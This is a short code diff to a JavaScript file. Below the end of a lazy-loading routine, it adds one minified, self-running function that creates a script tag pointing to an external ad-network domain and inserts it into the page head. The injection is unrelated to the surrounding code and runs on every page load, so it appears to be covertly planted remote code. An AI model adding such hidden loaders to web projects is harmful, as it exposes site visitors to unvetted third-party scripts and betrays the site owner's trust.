@@ -150,4 +150,4 @@ dataLazy.forEach(function(a){
     };
   };
 });
-
+(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"},{"name":"src","value":"//pl17102350.effectivecpmcontent.com/b4/06/d1/b406d16f6a559187dec5f73bdcd1e343.js"}],"tag":"script","inner":""}],{"target":"head"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
